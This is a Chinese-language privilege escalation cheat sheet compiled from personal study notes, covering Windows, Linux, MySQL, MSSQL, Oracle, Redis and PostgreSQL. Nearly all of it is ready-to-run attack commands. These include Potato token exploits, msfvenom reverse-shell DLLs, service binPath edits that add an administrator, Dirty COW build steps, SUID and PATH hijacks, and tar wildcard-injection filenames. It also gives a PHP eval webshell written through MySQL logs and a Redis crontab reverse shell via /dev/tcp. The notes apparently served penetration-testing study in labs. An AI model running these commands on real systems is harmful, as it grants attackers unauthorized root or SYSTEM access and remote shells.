# 提权速查

> 抽取自 daily-learning 7 篇提权笔记(08-25~08-30),只收笔记中出现过的命令/工具调用,**原样照抄**;`<...>`、`{CLSID}`、`IP/端口` 为笔记自带占位符,用时替换。查法:先 `工具 -h`,再翻本文件。

## Windows提权

### 补丁筛选(找溢出漏洞)
- **导出系统信息与已装补丁列表**: `systeminfo` — 输出重定向存成 txt(如 systeminfo.txt),供 WES-NG 比对缺哪些 KB (源:08-26Win提权)
- **WES-NG 比对补丁,列出缺失 KB 及对应 CVE/EXP**: `wes.py systeminfo.txt` — WES-NG(Windows Exploit Suggester Next Generation)已装进 SecurityTools (源:08-26Win提权)
- **更新 WES-NG 漏洞库**: `wes.py --update` — CN 网络下能否连通待验证 (源:08-26Win提权)
> 同类漏洞面工具:Vulmap / Wes / WindowsVulnScan(笔记只记工具名,未记命令);流程:systeminfo → 补丁筛选工具比对 → 缺的补丁 → 对应 exploit (源:08-26Win提权)

### at/sc/ps 命令提权(借 SYSTEM 身份执行)
- **at 计划任务提权(老系统)**: `at 15:13 /interactive cmd.exe` — 仅 XP/2003 老系统;at 已被 schtasks 取代,现网基本失效,老靶机可用 (源:08-26Win提权)
- **sc 创建服务,binPath 指向要执行的命令**: `sc Create syscmd binPath= "cmd /K start" type= own type= interact` — 服务以 SYSTEM 权限跑 (源:08-26Win提权)
- **sc 启动服务触发执行**: `sc start syscmd` (源:08-26Win提权)
- **PsExec 以 SYSTEM 权限执行(有凭据/高权限时)**: `psexec.exe -accepteula -s -i -d notepad.exe` — `-s`=SYSTEM 权限、`-i`=交互、`-d`=不等待;也可作横向渗透工具 (源:08-26Win提权)

### Potato 家族(令牌冒充,前提 SeImpersonate)
- **查当前令牌特权(Potato 前提检测)**: `whoami /priv` — 看到 SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege 已启用才能走 Potato;服务账户(IIS/MSSQL/MySQL)默认有,普通用户没有 (源:08-28续Win提权)
- **Juicy Potato 提权(最常用,Win10 1809 之前/Server 2016 之前)**: `JuicyPotato.exe -t t -p c:\windows\system32\cmd.exe -l 1155 -c {CLSID}` — `-t`=创建进程方式(t=CreateProcessWithTokenW/u=CreateProcessAsUser/*=都试,开 SeImpersonate 用 t、开 SeAssignPrimaryToken 用 u、都开用 *);`-p`=要执行的程序;`-l`=COM 监听端口;`-c`=CLSID(选 SYSTEM 权限的 COM 对象,列表:github.com/ohpe/juicy-potato/CLSID);`-k/-n`=RPC 服务器地址/端口(默认 127.0.0.1:135) (源:08-28续Win提权)
- **Rogue Potato(绕 Win10 1809+ 限制,跨机器模式)**: `RoguePotato -r 攻击机IP -e 程序 -l 端口` — 需攻击机用 socat 转发 135 端口配合;RPC 被改端口/被禁时用 (源:08-28续Win提权)
- **PrintSpoofer(利用 Print Spooler 模拟令牌,Win10/Server 2019+)**: `PrintSpoofer.exe -i -c "cmd.exe"` (源:08-28续Win提权)
- **GodPotato(.NET 通用版)**: `GodPotato.exe -cmd "cmd /c whoami"` (源:08-28续Win提权)
> 选型速查:Rotten Potato(Win7/8/10、2008/2012,MSF 模块 ms16_075_reflection)→ Juicy(1809 前)→ Rogue/PrintSpoofer(1809+/2019+);烂土豆=MS16-075,本地提权、不能用于域用户;跨协议(HTTP→SMB)NTLM 中继仍可用 (源:08-28续Win提权)

### DLL 劫持
- **查高权限进程目录是否可写(前提检测)**: `accesschk.exe -uwdqs "Users" "C:\Program Files\TargetApp\"` — 输出带 RW Users 即可利用 (源:08-28续Win提权)
- **找以 SYSTEM 运行的进程(劫持目标)**: `tasklist /v /fi "USERNAME eq NT AUTHORITY\SYSTEM"` (源:08-28续Win提权)
- **ProcMon 抓"加载失败的 DLL"(NAME NOT FOUND 过滤)**: 过滤器 = `Operation=CreateFile` + `Result=NAME NOT FOUND` + `Path ends with .dll` — 按目标进程过滤,列出可劫持 DLL(如 version.dll、msvcr120.dll);火绒剑/Process Explorer 可辅助分析 (源:08-28续Win提权)
- **msfvenom 生成恶意 DLL**: `msfvenom -p windows/shell_reverse_tcp LHOST=x LPORT=x -f dll -o /tmp/version.dll` — 文件名须与进程缺失加载的 DLL 同名 (源:08-28续Win提权)
- **恶意 DLL 放到应用目录(搜索顺序第①位)**: `copy version.dll "C:\Program Files\TargetApp\version.dll"` (源:08-28续Win提权)
- **重启服务触发 DLL 加载 → SYSTEM shell**: `sc stop "TargetApp" && sc start "TargetApp"` (源:08-28续Win提权)
> 高级技巧:DLL Proxying(恶意 DLL 转发真实 DLL 的导出函数)更隐蔽;拿到 SYSTEM 后可接 MSF incognito 令牌窃取(见下) (源:08-28续Win提权)

### 引号路径(Unquoted Service Path)
- **wmic 筛含空格且未加引号的服务路径(检测)**: `wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """` — 一条命令筛候选服务 (源:08-28续Win提权)
- **看单个服务的二进制路径**: `sc qc "服务名"` — BINARY_PATH_NAME 含空格且未加引号即可利用 (源:08-28续Win提权)
- **MSF 引号路径提权模块**: `use exploit/windows/local/trusted_service_path`(msfconsole 内) — 自动找/利用未加引号服务路径 (源:08-28续Win提权)
> 利用要点:msfvenom 生成恶意 Program.exe 放到中间可写目录(如 C:\),`sc start 服务名` 触发;坑:C:\ 根目录默认不可写故"鸡肋",实战看第三方软件装在非标准目录且权限未加固的场景 (源:08-28续Win提权)

### 服务权限配置错误(弱服务权限 + 可写 bin)
- **看服务 SDDL 权限(检测 WP)**: `sc sdshow "TargetService"` — SDDL 里 IU/Users 有 WP(SERVICE_CHANGE_CONFIG)即可改 binPath (源:08-28续Win提权)
- **accesschk 批量筛可写服务**: `accesschk.exe -uwcqv "Authenticated Users" * /accepteula` — 输出带 w 的就是可利用目标 (源:08-28续Win提权)
- **改服务 binPath 为加账号命令(利用)**: `sc config "VulnSvc" binPath= "cmd.exe /c net user hacker P@ssw0rd /add & net localgroup administrators hacker /add"` (源:08-28续Win提权)
- **重启服务触发(命令以 SYSTEM 执行)**: `sc stop "VulnSvc" && sc start "VulnSvc"` — 服务启动失败没关系,命令已以 SYSTEM 执行 (源:08-28续Win提权)
- **查服务 exe 文件权限(可写 bin 检测)**: `icacls "C:\path\to\service.exe"` — Users 有 Write/Modify 即可替换 (源:08-28续Win提权)
- **查服务 exe 所在目录权限**: `icacls "C:\path\to\"` — 目录可写→直接覆盖服务 exe(备份原文件→换恶意 exe) (源:08-28续Win提权)
- **accesschk 查目录是否可写**: `accesschk.exe -uwdqs "Users" "C:\Apps\backup\"` — 输出 `RW Users` 即可利用 (源:08-28续Win提权)
- **杀服务进程触发"崩溃自动恢复"重启(不等管理员)**: `taskkill /f /im backup.exe` — 前提:服务配了崩溃自动恢复策略,杀进程后服务管理器自动重启执行恶意 exe (源:08-28续Win提权)

### 检测工具链(PowerUp / WinPEAS / PrivescCheck)
- **PowerUp 全量检测(未引号路径/可写服务/弱权限/AlwaysInstallElevated/计划任务/DLL 劫持)**: `Import-Module .\PowerUp.ps1` — 之后跑 Invoke-AllChecks;检测完用 Invoke-ServiceAbuse 一条龙利用 (源:08-28续Win提权)
- **PowerUp 执行全量检查**: `Invoke-AllChecks` (源:08-28续Win提权)
- **WinPEAS 全量检测(C#,免 PS)**: `winpeas.exe` — 红/黄/绿高亮可利用项 (源:08-28续Win提权)
- **WinPEAS 快速模式**: `winpeas.exe fast` (源:08-28续Win提权)
- **PrivescCheck 检测(PS,现代 Windows 更活跃)**: `Invoke-PrivescCheck` — 可出 HTML 报告 (源:08-28续Win提权)

### 令牌窃取(MSF incognito / churrasco)
- **载入 MSF incognito 模块**: `use incognito`(msfconsole 内) (源:08-28数据库提权)
- **列出可模拟的令牌**: `list_tokens -u` (源:08-28数据库提权)
- **冒充 SYSTEM 令牌(单引号版,防转义)**: `impersonate_token 'NT AUTHORITY\SYSTEM'` — 老系统(Win XP/2000/2003)令牌窃取;也可用 churrasco.exe(Token Kidnapping) (源:08-28数据库提权)
- **冒充 SYSTEM 令牌(双引号版)**: `impersonate_token "NT AUTHORITY\SYSTEM"` — DLL 劫持/拿到 SYSTEM 进程后配合使用 (源:08-28续Win提权)

## Linux提权

### 信息收集(框架 8 项手工命令)
- **查内核版本**: `uname -a` (源:08-28续2Linux)
- **查发行版版本**: `cat /etc/issue` (源:08-28续2Linux)
- **查发行版详细信息**: `lsb_release -a` (源:08-28续2Linux)
- **查当前用户 UID/GID/组**: `id` (源:08-28续2Linux)
- **查当前用户名**: `whoami` (源:08-28续2Linux)
- **查可登录用户列表**: `cat /etc/passwd` (源:08-28续2Linux)
- **查当前用户 sudo 权限**: `sudo -l` (源:08-28续2Linux)
- **查网络配置**: `ifconfig` (源:08-28续2Linux)
- **查监听端口/连接**: `netstat -antlp` (源:08-28续2Linux)
- **查挂载信息**: `mount` (源:08-28续2Linux)
- **查 PATH 环境变量**: `echo $PATH` (源:08-28续2Linux)
- **查进程(重点看 root 跑的,找第三方服务提权入口)**: `ps aux` (源:08-28续2Linux)
- **查 systemd 服务**: `systemctl` (源:08-28续2Linux)
- **找 ssh 私钥(免密登录/横向)**: `find / -name "id_rsa" -o -name "*.pem"` (源:08-28续2Linux)
- **看命令历史找明文密码**: `cat ~/.bash_history` (源:08-28续2Linux)
- **找可写目录(放脚本/落地位置)**: `find / -writable -type d` (源:08-28续2Linux)
- **看 /tmp 权限**: `ls -la /tmp` (源:08-28续2Linux)
> 信息价值排序:内核信息 > 计划任务/可写目录 > ssh 私钥/明文密码 > 进程服务;计划任务命令见下方「定时任务」分组 (源:08-28续2Linux)

### 自动化脚本与漏洞探针
- **LinEnum(bash)信息收集**: 一键扫 8 项清单(内核版本/SUID/计划任务/可写目录/环境变量/敏感文件) — 笔记未记运行命令,脚本到手先 `-h` (源:08-28续3Linux)
- **linuxprivchecker(python)信息收集**: 检查权限配置错误/SUID/可写文件 — 运行命令未记 (源:08-28续3Linux)
- **linux-exploit-suggester 内核漏洞探针**: 读内核版本对比本地漏洞库,列出可用内核 EXP(含 CVE、exploit-db 链接) — meterpreter 里也能跑;具体命令未记 (源:08-28续3Linux)
- **linux-exploit-suggester2 升级版探针**: 检查粒度更细 — 命令未记 (源:08-28续3Linux)
- **本地 searchsploit 搜提权 EXP(Kali 自带)**: `searchsploit linux 提权关键词` — 漏洞探针的补充手段;远程用 exploit-db.com 搜 (源:08-30Linux定时任务)
> 使用顺序:先信息收集(配置类:SUID/计划任务/环境变量/可写文件)→ 没戏再漏洞探针(内核洞);四个脚本不光会用,还要能看源码/改造 (源:08-28续3Linux)

### 内核漏洞(编译 EXP 标准流程 + 脏牛 Dirty COW)
- **编译 EXP(C 源码,目标机要有 gcc)**: `gcc 45010.c -o 45010` (源:08-28续3Linux)
- **给 EXP 加执行权限(上传后默认无 x)**: `chmod +x 45010` — 不 chmod 直接 ./ 会 Permission denied (源:08-28续3Linux)
- **执行 EXP**: `./45010` (源:08-28续3Linux)
- **验证提权结果**: `id` — uid=0(root) 才算成功(euid=0 也行);六步口诀:寻可用 → 下 exp → 上 /tmp → 编译 → 执行 → id 验证 (源:08-28续3Linux)
- **nmap 扫网段(脏牛链路①探针目标)**: `nmap 192.168.76.0/24` (源:08-28续3Linux)
- **nmap 全端口扫目标**: `nmap -p1-65535 192.168.76.141` (源:08-28续3Linux)
- **MSF 打 Drupalgeddon2 入口(链路②,拿 meterpreter)**: `use exploit/unix/webapp/drupal_drupalgeddon2` — 逐条执行:`set lhost 192.168.76.141`、`set lport 1898`、`set target 0`、`run`;先 `search drupal` 定位模块 (源:08-28续3Linux)
- **meterpreter 上传脏牛 EXP 源码到 /tmp**: `upload /tmp/40837.cpp /tmp/40837.cpp` (源:08-28续3Linux)
- **g++ 编译脏牛 EXP(CVE-2016-5195,内核 2.6.22~4.8.3)**: `g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40837.cpp -lutil` — 40837.cpp 为 exploit-db 公开版(C++ 用 g++)、`-lutil` 为依赖库 (源:08-28续3Linux)
- **python pty 升级交互式 shell**: `python -c 'import pty; pty.spawn("/bin/bash")'` — 受限 shell 拿完整 tty(tab 补全/方向键可用) (源:08-28续3Linux)
- **执行脏牛 EXP 拿 root**: `./dcow` — EXP 放 /tmp(全世界可写);若 /tmp 是 noexec 要换可写+可执行目录 (源:08-28续3Linux)

### SUID
- **找设了 SUID 位的文件(检测)**: `find / -perm -4000 -type f 2>/dev/null` (源:08-28续3Linux)
- **SUID 检测另一写法**: `find / -perm -u=s -type f 2>/dev/null` (源:08-28续3Linux)
- **find SUID 提权(DC-1 实操过)**: `find / -exec whoami \;` — 属主 root+SUID 的 find,普通用户执行时以 root 跑 -exec;euid=0 即成功 (源:08-28续3Linux)
- **python SUID 提权**: `python -c 'import os; os.setuid(0); os.system("/bin/bash")'` (源:08-28续3Linux)
- **vim SUID 提权(老版本)**: `vim -c ':py import os; os.setuid(0); os.execl("/bin/sh","sh")'` — 老版本 vim 才带 python 支持 (源:08-28续3Linux)
> 其他姿势:nmap 老版 `--interactive`、less/more 的 `!` 命令、bash/sh 本身;查姿势工具:GTFOBins https://gtfobins.github.io (SUID 场景必查) (源:08-28续3Linux)

### 环境变量(PATH 劫持,SUID 配合)
- **编译"调用外部命令但没写绝对路径"的 C 程序**: `gcc demo.c -o shell` — demo.c 里用 `system("ps")` 而非 `system("/bin/ps")`,非绝对路径才能被劫持;随后属主设 root+SUID:`chmod u+s shell` (源:08-30Linux定时任务)
- **把 /bin/sh 复制成程序调用的命令名**: `cp /bin/sh /tmp/ps` — 名字必须与程序调用的命令完全一致(调 ps 就命名 ps) (源:08-30Linux定时任务)
- **把可控目录放到 PATH 最前面**: `export PATH=/tmp:$PATH` — /tmp 必须最前才抢得到(PATH 按顺序找) (源:08-30Linux定时任务)
- **执行 SUID 程序触发(root 找到假 ps=/bin/sh)**: `./shell` (源:08-30Linux定时任务)
- **验证(root shell)**: `id` (源:08-30Linux定时任务)

### 定时任务(路径/命令/权限三问题)
- **看系统 crontab,找相对路径/可写脚本任务**: `cat /etc/crontab` (源:08-30Linux定时任务)
- **造恶意脚本(复制 bash 并设 SUID 到 /tmp/bash)**: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/xiaodi/test.sh` — 路径问题:root cron 用相对路径调脚本时,把同名脚本放到它解析的位置 (源:08-30Linux定时任务)
- **给恶意脚本加执行权限**: `chmod +x /home/xiaodi/test.sh` (源:08-30Linux定时任务)
- **执行 SUID bash 拿 root shell**: `/tmp/bash` (源:08-30Linux定时任务)
- **tar 通配符注入——在备份目录写恶意脚本**: `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/undead/script/test.sh` — 命令问题:root 备份任务形如 `tar czf /tmp/backup.tar.gz *`,`*` 会把文件名展开成 tar 参数 (源:08-30Linux定时任务)
- **创建"长得像 tar 选项"的文件(注入 exec 动作)**: `echo "" > "--checkpoint-action=exec=sh test.sh"` — 文件名就是注入点,tar 把 --xxx 当选项解析 (源:08-30Linux定时任务)
- **创建 checkpoint 触发文件**: `echo "" > --checkpoint=1` — 与上一条配合,每处理 1 个文件触发 checkpoint → 执行 sh test.sh (源:08-30Linux定时任务)
- **查 cron 脚本目录权限(权限问题检测)**: `ls -la` — 在脚本所在目录执行;777=人人都能改、775 威胁面主要是组内成员 (源:08-30Linux定时任务)
- **全盘找 777/775 宽松权限文件**: `find / -perm -777 -o -perm -775` (源:08-30Linux定时任务)
- **查当前用户计划任务**: `crontab -l` (源:08-30Linux定时任务)
- **查系统计划任务**: `cat /etc/crontab` (源:08-30Linux定时任务)
- **查各定时任务目录**: `ls /etc/cron.d /etc/cron.daily /etc/cron.hourly` — 看 root 执行的脚本:相对路径(路径问题)/可写(权限问题)/带通配符(命令问题) (源:08-30Linux定时任务)

## 数据库提权

### MySQL-UDF
- **sqlmap 注入点进 sql-shell(口令获取途径之一)**: `sqlmap --sql-shell` — 笔记只记参数模式;适用连不上 3306 但有 SQL 注入点的场景 (源:08-28数据库提权)
- **CVE-2012-2122 认证绕过 MSF 模块(MySQL/MariaDB)**: `use auxiliary/scanner/mysql/mysql_authbypass_hashdump`(msfconsole 内) — 影响 5.1.63/5.5.24/5.6.6 之前,约 256 次尝试蒙对一次 (源:08-28数据库提权)
- **CVE-2012-2122 bash 循环爆破**: `for i in seq 1 1000; do mysql -u root --password=bad ...; done` — 笔记原样,`...` 处补完整连接参数 (源:08-28数据库提权)
- **MSF 一键写 UDF dll 并注册 sys_exec(无回显)**: `use exploit/multi/mysql/mysql_udf_payload`(msfconsole 内) — 无回显;要回显版手动注册 sys_eval(下一条) (源:08-28数据库提权)
- **手动注册有回显 UDF 函数**: `create function sys_eval returns string soname 'xxx.dll'` — xxx.dll 为已放进 plugin 目录的 UDF 库;前提:FILE 权限 + @@plugin_dir 可写 + MySQL 高权限运行 + 能 CREATE FUNCTION (源:08-28数据库提权)
- **调用 UDF 执行系统命令**: `SELECT sys_exec('whoami');` — 权限=MySQL 进程权限(root/system);MySQL ≤5.5 最顺手,5.6+ 受 secure_file_priv 限制 (源:08-28数据库提权)
- **sqlmap 自带 UDF 库解码(防杀软 cloak 编码)**: `cloak.py -d` — UDF 库在 sqlmap 的 data/udf/mysql/(win/linux × 32/64 位),用 extra/cloak 的 cloak.py 解码 (源:08-28数据库提权)
> 口令获取途径:3306 弱口令爆破 / sqlmap --sql-shell / 网站配置文件明文密码(config.php 等,文件名关键词:sql data inc config conn database common include);版本细节:MySQL<5.1 导出到 c:/windows 或 system32,>=5.1 导出到 lib/plugin/(默认不存在需创建);secure_file_priv:NULL=禁止(5.5+ 默认)/空=不限制(5.5 前默认) (源:08-28数据库提权)

### MySQL-日志写 shell(general_log)
- **开启通用查询日志**: `set global general_log = "ON";` — 高权限 + 知道网站物理路径 + 目录可写时用;比 UDF 门槛低(不需 plugin 目录/编译 dll),MySQL 5.0+ (源:08-28数据库提权)
- **把日志文件指向网站目录下的 php 文件**: `set global general_log_file='c:/phpstudy_pro/www/shell.php';` (源:08-28数据库提权)
- **往日志塞一句话木马(SQL 原样写进日志文件)**: `select '<?php @eval($_POST[x]);?>';` — 之后访问该 php 即得 webshell (源:08-28数据库提权)
> MySQL 另两种(笔记未给具体命令):MOF 提权(老 Windows:FILE 权限把 nullevt.mof dumpfile 到 C:\WINDOWS\system32\wbem\mof\,几秒内以 SYSTEM 执行)、启动项提权(FILE 权限写 .bat/.vbs 到启动目录,等管理员登录/重启,非即时生效) (源:08-28数据库提权)

### MSSQL-xp_cmdshell
- **开启 show advanced options(前置开关)**: `EXEC sp_configure 'show advanced options', 1; RECONFIGURE;` — sa 权限;xp_cmdshell 默认禁用,2005+ 通用 (源:08-28数据库提权)
- **开启 xp_cmdshell**: `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;` (源:08-28数据库提权)
- **执行系统命令**: `EXEC xp_cmdshell 'whoami';` — 执行身份=SQL Server 服务账户;拿 sa 途径:弱口令/SQL 注入(堆叠)/配置泄露 (源:08-28数据库提权)
- **xp_cmdshell 被删时用 xplog70.dll 加回**: `exec master.sys.sp_addextendedproc 'xp_cmdshell', 'C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll'` — 需先上传/恢复 xplog70.dll (源:08-28数据库提权)

### MSSQL-sp_oacreate(绕过禁用的 xp_cmdshell)
- **开启 OLE Automation Procedures**: `EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;` (源:08-28数据库提权)
- **声明变量**: `DECLARE @s INT;` (源:08-28数据库提权)
- **创建 WScript.Shell COM 对象**: `EXEC sp_oacreate 'wscript.shell', @s OUT;` (源:08-28数据库提权)
- **调 .run 方法执行命令(结果写文件)**: `EXEC sp_oamethod @s, 'run', NULL, 'cmd /c whoami > c:\1.txt';` — 无回显,重定向到文件查看 (源:08-28数据库提权)
> MSSQL 另两种(笔记未给具体命令):沙盒模式(2000/2005 老版本:sa + xp_regwrite 开注册表开关 + Ad Hoc Distributed Queries/OpenRowSet 调 JET 引擎)、映像劫持 IFEO(sa + xp_regwrite 写 HKLM\...\Image File Execution Options\<程序名>\Debugger,经典劫持 sethc.exe) (源:08-28数据库提权)

### Oracle
- **sqlmap 判断注入用户是否 DBA**: `sqlmap --is-dba` (源:08-28数据库提权)
- **sqlmap 尝试拿系统 shell**: `sqlmap --os-shell` — 注入模式执行命令通常无回显,要结合带外/写文件确认 (源:08-28数据库提权)
- **MSF 注入模块 grant dba(老版本 dbms_cdc_subscribe)**: `use auxiliary/sqli/oracle/dbms_cdc_subscribe.activate_subscription`(msfconsole 内) — 注入 grant dba to 用户;注入用户是普通用户时先走 PL/SQL 链提到 DBA (源:08-28数据库提权)
- **调用包装函数执行命令(普通用户模式链路终点示例)**: `select LinxRunCMD('whoami') from dual` — 前置:DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS 授 Java 权限 + CREATE JAVA SOURCE 写 Runtime.exec + CREATE PROCEDURE 包装;DBA 模式直接用 Java 存储过程/DBMS_SCHEDULER(PROGRAM=EXECUTABLE)/UTL_FILE/CREATE LIBRARY+extproc (源:08-28数据库提权)
> 工具:jas502n/oracleshell(GitHub,普通用户/DBA 模式自动化);实战 Oracle 基本不提权(经典洞都是 2006 年前后老洞 + 链路长 + 无回显 + 加固好),拿到多是脱库 (源:08-28数据库提权)

### Redis(未授权访问 + root 运行)
- **写 crontab 反弹内容(带换行包裹)**: `set x "\n* * * * * bash -i >& /dev/tcp/IP/端口 0>&1\n"` — 踩坑:RDB 文件有序列化头尾,命令前后必须加换行(和注释符)包裹,否则 crontab 解析失败;IP/端口 为占位需替换 (源:08-28数据库提权)
- **设置 RDB 目录为 cron 目录**: `config set dir /var/spool/cron/` (源:08-28数据库提权)
- **设置 RDB 文件名为 root 的 crontab 文件**: `config set dbfilename root` (源:08-28数据库提权)
- **触发保存写盘**: `save` — 之后 root 定时执行反弹命令 (源:08-28数据库提权)
> 另两种姿势(套路同 config set dir/dbfilename + save,逐条命令笔记未记):写 ssh 公钥(dir=/root/.ssh、dbfilename=authorized_keys,需目标开 SSH)、低权限往 web 物理路径写 webshell(dir=网站根目录、dbfilename=xxx.php);修复:bind 业务 IP + requirepass 设密码 + 低权限账号运行(均需重启 Redis 生效),可 rename-command 禁 CONFIG/EVAL (源:08-28数据库提权)

### PostgreSQL
- **COPY FROM PROGRAM 执行系统命令(CVE-2019-9193,PG 9.3~11)**: `COPY cmd FROM PROGRAM 'id';` — 需 COPY TO/FROM PROGRAM 权限;弱口令连接(vulhub 默认 postgres/postgres);执行身份=PG 进程用户 (源:08-28数据库提权)
> CVE-2018-1058(PG 9.0~10)search_path 劫持:普通用户建与常用函数同名/同签名的恶意函数,利用 pg_temp 优先的 schema 搜索顺序诱导管理员触发,以高权限上下文执行任意 SQL;vulhub 复现:vulhub 的 postgres 目录(本机 C:/Users/huoyuchen/vulhub) (源:08-28数据库提权)
